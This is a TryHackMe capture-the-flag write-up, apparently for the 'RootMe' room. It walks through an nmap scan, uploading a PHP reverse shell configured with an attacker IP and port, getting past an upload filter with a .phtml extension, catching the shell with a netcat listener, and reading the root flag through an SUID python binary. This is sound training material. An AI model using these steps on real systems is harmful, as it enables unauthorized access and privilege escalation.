Another THM Privilege Escalation Machine üîì

Released: 2024-02-28


## Nmap Scan

```bash
‚îå‚îÄ‚îÄ(vipin„âøvipin)-[~]
‚îî‚îÄ$ sudo nmap -sS -sV 10.10.102.215
[sudo] password for vipin:

- Only ports 22 & 80 are open.

> Port 22 - **ssh**  
> Port 80 - **http Apache 2.4.29**

## Dirsearch

- Whilst the room advises us to use *Gobuster*, instead I will use *Dirsearch*.

</div>

- The only hidden/useful directory to us is `/panel`

## Obtaining the User Flag

- In `/panel`, we find an upload panel (Fig.2)...

- We might need to find or make a PHP script to gain user access.

- A community favorite for gaining a reverse shell is [this PHP script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Make sure to modify lines 49 & 50 with your IP & Port (up to you). Optional: change 54 with your desired shell.

``` bash
49 $ip = '10.2.121.184';  // CHANGE THIS
50 $port = 4444;       // CHANGE THIS
¬∑¬∑¬∑
54 $shell = 'uname -a; w; id; /bin/bash -i';
```

- I originally attempted to bypass the PHP filter by renaming the file to *"revshell.png.php"* and as we can see, it didn't end well...

</div>

- The upload panel is mad at me ‚òπÔ∏è

- The next solution was to rename the file to *"revshell.phtml"* and it successfully uploaded! After that, head to `/uploads` and click on the uploaded PHP script for it to run. 

```bash
# Note: Before I modified the script to use bash, I used sh
‚îå‚îÄ‚îÄ(vipin„âøvipin)-[~]
‚îî‚îÄ$ nc -lvnp 4444 # Set up a listener before clicking the PHP script.

## Aquiring Root Privileges

- The hint provides a command to search for **SUID Binaries**. After running it, there were only a select few that were potential **SUID Binaries** with `/usr/bin/python` being the prime suspect.

- We can take advantage of Python being an **SUID Binary** by exploiting it to read the root flag file. [GTFObins](https://gtfobins.github.io/gtfobins/python/#file-read) has various methods to take advantage of these **SUID Binaries**.

```bash
www-data@rootme:/$ python -c 'print(open("/root/root.txt").read())' 
python -c 'print(open("/root/root.txt").read())'
THM{XXXXXXXXXXXXXXXXXXX}
```
